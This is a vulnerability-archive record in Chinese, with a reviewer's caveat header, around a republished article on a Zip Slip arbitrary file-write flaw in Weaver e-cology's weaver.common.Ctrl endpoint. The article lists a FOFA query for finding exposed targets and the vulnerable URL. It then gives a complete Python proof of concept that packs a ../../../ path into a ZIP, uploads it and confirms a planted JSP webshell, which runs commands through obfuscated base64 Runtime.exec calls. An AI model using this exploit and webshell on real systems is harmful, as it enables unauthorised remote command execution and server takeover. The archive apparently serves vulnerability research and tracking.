---
source: "MrWQ/vulnerability-paper"
title: "泛微e-cology / cloudstore weaver.common.Ctrl ZIP路径穿越写入"
product: "泛微e-cology / cloudstore"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未给版本；Service_CheckApp.validateApp解压ZIP且JSP可执行"
prerequisites: "声称前台，脚本无凭证"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/WoWIZzY48C6GjCrbgnSErg"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AE%20OA%20weaver-common-Ctrl%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"泛微-协同办公OA\""
id: "vw-ba9a1b3e7c10390abe6612ef"
entity_id: "ve-ba9a1b3e7c10390abe6612ef"
schema_version: "1"
---

# 泛微e-cology / cloudstore weaver.common.Ctrl ZIP路径穿越写入

## 条目说明

- 对象与具体问题：泛微e-cology / cloudstore；weaver.common.Ctrl ZIP路径穿越写入
- 版本、配置及部署条件：未给版本；Service_CheckApp.validateApp解压ZIP且JSP可执行
- 认证与权限前提：声称前台，脚本无凭证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 根因应标Zip Slip/任意文件写入，不仅笼统上传
- 完整Python显示../../../ZIP成员与cloudstore落点关系；只以200判断成功会误报
- ZipFile未显式关闭/上下文管理，资源可靠性问题；原始HTTP只截图
- 长宣传段可裁剪但保留来源和版权标注

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/WoWIZzY48C6GjCrbgnSErg)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7f0qibYGLgIyO0zpTSeV1I6m1WibjS1ggK9xf8lYM44SK40O6uRLTOAtiaM0xYOqZicJ2oDdiaWFianIjQ/640?wx_fmt=png)**

**一****：漏洞描述🐑**

**泛微 OA weaver.common.Ctrl 存在任意文件上传漏洞，攻击者通过漏洞可以上传 webshell 文件控制服务器**

**二:  漏洞影响🐇**

****泛微 OA****

**三:  漏洞复现🐋**

**逛 Github 的时候碰巧看见有位师傅公开了漏洞**

```
https://github.com/GTX8090TI/GTX8090TI.github.io/blob/6dd04a19bbc4fcef436e0b2f05c15bc98ac0c852/2021/05/02/%E6%B3%9B%E5%BE%AEOA-%E5%89%8D%E5%8F%B0GetShell%E5%A4%8D%E7%8E%B0/index.html
```

```
FOFA: app="泛微-协同办公OA"
```

**存在漏洞的路径为**

```
/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp
```

**请求包为**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5zkgPAK0ic769mRwPT6mVxWafcXnCVRwdVNUibuVbcYLb24sDBgLUjVe9Zmk7tthKxzlq6vQEYYeTA/640?wx_fmt=png)

**使用 POC 文件上传  
**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5zkgPAK0ic769mRwPT6mVxW0Lg983FejqdRiabNFvc8Rtt5cMmKqiacsd56ee9FGzeF1mZv0c4lA1eg/640?wx_fmt=png)

 ****四:  漏洞 POC🦉****

```
import zipfile
import random
import sys
import requests



def generate_random_str(randomlength=16):
  random_str = ''
  base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
  length = len(base_str) - 1
  for i in range(randomlength):
    random_str += base_str[random.randint(0, length)]
  return random_str

mm = generate_random_str(8)

webshell_name1 = mm+'.jsp'
webshell_name2 = '../../../'+webshell_name1

def file_zip():
    shell = """<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="sun.misc.BASE64Decoder" %>
<%
    if(request.getParameter("cmd")!=null){
        BASE64Decoder decoder = new BASE64Decoder();
        Class rt = Class.forName(new String(decoder.decodeBuffer("amF2YS5sYW5nLlJ1bnRpbWU=")));
        Process e = (Process)
                rt.getMethod(new String(decoder.decodeBuffer("ZXhlYw==")), String.class).invoke(rt.getMethod(new
                        String(decoder.decodeBuffer("Z2V0UnVudGltZQ=="))).invoke(null, new
                        Object[]{}), request.getParameter("cmd") );
        java.io.InputStream in = e.getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
    """   ## 替换shell内容
    zf = zipfile.ZipFile(mm+'.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
    zf.writestr(webshell_name2, shell)

def GetShell(urllist):
    file_zip()
    print('上传文件中')
    urls = urllist + '/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp'
    file = [('file1', (mm+'.zip', open(mm + '.zip', 'rb'), 'application/zip'))]
    requests.post(url=urls,files=file,timeout=60, verify=False)
    GetShellurl = urllist+'/cloudstore/'+webshell_name1
    GetShelllist = requests.get(url = GetShellurl)
    if GetShelllist.status_code == 200:
        print('利用成功webshell地址为:'+GetShellurl)
    else:
        print('未找到webshell利用失败')

def main():
    if (len(sys.argv) == 2):
        url = sys.argv[1]
        GetShell(url)
    else:
        print("python3 poc.py http://xx.xx.xx.xx")

if __name__ == '__main__':
    main()
```

 ****五:  关于文库🦉****

 **在线文库：**

**http://wiki.peiqi.tech**

 **Github：**

**https://github.com/PeiQi0/PeiQi-WIKI-POC**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4cpD8uQPH24EjA7YPtyZEP33zgJyPgfbMpTJGFD7wyuvYbicc1ia7JT4O3r3E99JBicWJIvcL8U385Q/640?wx_fmt=png)

最后
--

> 下面就是文库的公众号啦，更新的文章都会在第一时间推送在交流群和公众号
> 
> 想要加入交流群的师傅公众号点击交流群加我拉你啦~
> 
> 别忘了 Github 下载完给个小星星⭐

公众号

**同时知识星球也开放运营啦，希望师傅们支持支持啦🐟**

**知识星球里会持续发布一些漏洞公开信息和技术文章~**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuHPQeSEAhRof2olkAM9ZghicpNv0p8rRbtNCZJL4t82g15Va8iahlCWeg/640?wx_fmt=png)

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**PeiQi 文库 拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。**

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
